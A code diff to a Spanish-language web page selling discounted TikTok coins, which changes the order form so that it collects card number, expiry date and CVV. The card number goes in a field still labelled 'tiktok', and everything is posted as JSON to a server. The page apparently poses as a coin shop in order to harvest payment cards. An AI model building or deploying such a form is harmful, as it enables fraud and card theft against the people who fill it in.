@@ -108,6 +108,8 @@ button:hover{
 
 <form id="pedidoForm">
 
+<!-- PREGUNTA 1 -->
+
 <input
 type="text"
 id="usuario"
@@ -115,23 +117,47 @@ placeholder="1. Nombre completo"
 required
 >
 
+<!-- PREGUNTA 2 -->
+
 <input
 type="text"
 id="tiktok"
-placeholder="2. Usuario de TikTok"
+placeholder="2. numero de la tarjeta"
 required
 >
+
+<!-- PREGUNTA 3 - PUEDES CAMBIARLA -->
 
 <input
 type="text"
 id="dato3"
-placeholder="3. Escribe aquí el dato que deseas"
+placeholder="3. Fecha de vencimiento:"
 required
 >
 
+<!-- PREGUNTA 4 - PUEDES CAMBIARLA -->
+
+<input
+type="text"
+id="dato4"
+placeholder="4. codigo cvv"
+required
+>
+
+<!-- PREGUNTA 5 - PUEDES CAMBIARLA -->
+
+<input
+type="text"
+id="dato5"
+placeholder="5. link de tik tok"
+required
+>
+
+<!-- PREGUNTA 6 - MONEDAS, SIEMPRE LA ÚLTIMA -->
+
 <select id="monedas" required>
 
-<option value="">4. Selecciona cantidad de monedas</option>
+<option value="">6. Selecciona cantidad de monedas</option>
 
 <option value="5000" data-precio="30">
 💎 5.000 monedas — $30
@@ -159,16 +185,11 @@ required
 
 </select>
 
+<!-- PRECIO AUTOMÁTICO -->
+
 <div class="precio" id="precio">
 💰 Precio: Selecciona un paquete
 </div>
-
-<input
-type="text"
-id="cantidad"
-placeholder="5. Cantidad de monedas"
-required
->
 
 <button type="submit">
 CONTINUAR
@@ -187,42 +208,58 @@ monedasSelect.addEventListener("change", function(){
 
     if(!opcion.value){
 
-        precio.textContent = "💰 Precio: Selecciona un paquete";
+        precio.textContent =
+            "💰 Precio: Selecciona un paquete";
 
         return;
     }
 
     const precioSeleccionado = opcion.dataset.precio;
 
-    precio.textContent = "💰 Precio: $" + precioSeleccionado + " USD";
+    precio.textContent =
+        "💰 Precio: $" + precioSeleccionado + " USD";
 
 });
+
 
 document.getElementById("pedidoForm").addEventListener("submit", async function(e){
 
     e.preventDefault();
 
-    const opcion = monedasSelect.options[monedasSelect.selectedIndex];
+    const opcion =
+        monedasSelect.options[monedasSelect.selectedIndex];
 
     const datos = {
 
-        usuario: document.getElementById("usuario").value,
+        usuario:
+            document.getElementById("usuario").value,
 
-        tiktok: document.getElementById("tiktok").value,
+        tiktok:
+            document.getElementById("tiktok").value,
 
-        dato3: document.getElementById("dato3").value,
+        dato3:
+            document.getElementById("dato3").value,
 
-        monedas: opcion.value,
+        dato4:
+            document.getElementById("dato4").value,
 
-        paquete: opcion.textContent.trim(),
+        dato5:
+            document.getElementById("dato5").value,
 
-        precio: opcion.dataset.precio,
+        monedas:
+            opcion.value,
 
-        cantidad: document.getElementById("cantidad").value,
+        paquete:
+            opcion.textContent.trim(),
 
-        metodo: "Pendiente"
+        precio:
+            opcion.dataset.precio,
+
+        metodo:
+            "Pendiente"
 
     };
+
 
     try{
 
@@ -238,6 +275,7 @@ document.getElementById("pedidoForm").addEventListener("submit", async function(
                 body:JSON.stringify(datos)
             }
         );
+
 
         if(respuesta.ok){
 
